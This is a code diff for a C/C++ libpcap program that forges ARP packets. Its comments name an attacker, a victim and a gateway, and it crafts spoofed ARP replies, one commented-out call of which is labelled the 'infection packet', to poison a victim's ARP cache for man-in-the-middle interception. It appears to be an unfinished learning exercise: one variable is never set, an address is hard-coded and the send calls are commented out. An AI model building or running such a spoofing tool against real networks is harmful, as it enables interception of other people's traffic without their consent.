@@ -2,6 +2,9 @@
 #include <cstring>
 #include <pcap.h>
 #include <arpa/inet.h>//ip -> bin
+#include <netinet/in.h>
+#include <sys/utsname.h>
+#include <netdb.h>
 
 #define PCAP_OPENFLAG_PROMISCUOUS   1   // Even if it isn't my mac, receive packet
 #pragma pack(push,1)
@@ -30,19 +33,33 @@ void mac_changer(const char *ipm,uint8_t *opm) //ipm = inputmac, opm = outputmac
 {
     sscanf(ipm,"%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",&opm[0],&opm[1],&opm[2],&opm[3],&opm[4],&opm[5]);    //%x cause an error, fix to %2hhx
 }
-void arp_reply(const char *dev,const char *snd_ip,const char *snd_mac,const char *trg_ip,const char *trg_mac)
+void arp_request(char *snd_ip,char *snd_mac,char *trg_ip,pcap_t *fp)
 {
     struct my_hdr mh;
     struct _ether_hdr *eh = &mh.eh;
     struct _arp_hdr *ah = &mh.ah;
-
-    pcap_t *fp;
-    char errbuf[PCAP_ERRBUF_SIZE];
-
-    if ( (fp= pcap_open_live(dev, 42, PCAP_OPENFLAG_PROMISCUOUS , 1000, errbuf)) == NULL)
+    inet_pton(AF_INET,snd_ip,&ah->sender_ip);
+    mac_changer(snd_mac,eh->Src_mac);
+    inet_pton(AF_INET,trg_ip,&ah->target_ip);
+    memset(eh->Dst_mac,0xFF,sizeof(eh->Dst_mac));
+    memcpy(ah->sender_mac,eh->Src_mac,6);
+    memset(ah->target_mac,0x00,sizeof(ah->target_mac));
+    eh->ether_type = ntohs(0x0806);
+    ah->htype = ntohs(0x0001);
+    ah->ptype = ntohs(0x0800);
+    ah->hlen = 0x06;
+    ah->plen = 0x04;
+    ah->opcode = ntohs(0x0001);
+    if(pcap_sendpacket(fp,(const u_char*)&mh,42) != 0)
     {
-        fprintf(stderr,"Unable to open the adapter. %s is not supported by Pcap\n", dev);
+        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
     }
+}
+void arp_reply(char *snd_ip,char *snd_mac,char *trg_ip, char *trg_mac,pcap_t *fp)
+{
+    struct my_hdr mh;
+    struct _ether_hdr *eh = &mh.eh;
+    struct _arp_hdr *ah = &mh.ah;
     inet_pton(AF_INET,snd_ip,&ah->sender_ip);
     mac_changer(snd_mac,eh->Src_mac);
     inet_pton(AF_INET,trg_ip,&ah->target_ip);
@@ -60,7 +77,6 @@ void arp_reply(const char *dev,const char *snd_ip,const char *snd_mac,const char
         fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
     }
 }
-
 int main(int argc,char *argv[])
 {
     if(argc != 6)
@@ -69,6 +85,27 @@ int main(int argc,char *argv[])
         printf("EX : DEVICE SENDER_IP SENDER_MAC TARGET_IP TARGET_MAC\n");
         return 1;
     }
+/*  attacker= atk_ip,atk_mac    (attacker)
+    sender	= snd_ip,snd_mac    (victim)
+    receiver= rcv_ip,rcv_mac    (gateway)*/
+
     char *dev = argv[1];    //get device name
-    arp_reply(dev,argv[2],argv[3],argv[4],argv[5]);
+    char *atk_ip = "192.168.205.129";   //arp_request test
+    char *atk_mac = argv[3];//get attacker mac addr
+    char *snd_ip = argv[4]; //get victim ip addr
+    char *snd_mac = argv[5];//get victim mac addr
+    char *rcv_ip = argv[2]; //get gateway ip addr
+    char *rcv_mac;
+
+    char errbuf[PCAP_ERRBUF_SIZE];
+
+    pcap_t *fp;
+
+    if ( (fp= pcap_open_live(dev, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS , 1, errbuf)) == NULL)
+    {
+        fprintf(stderr,"Unable to open the adapter. %s is not supported by Pcap\n", dev);
+    }
+    //arp_reply(rcv_ip,atk_mac,snd_ip,snd_mac,fp);  //send infection packet
+   //arp_request(atk_ip,atk_mac,rcv_ip,fp);    //send who has rcv_ip?
+
 }
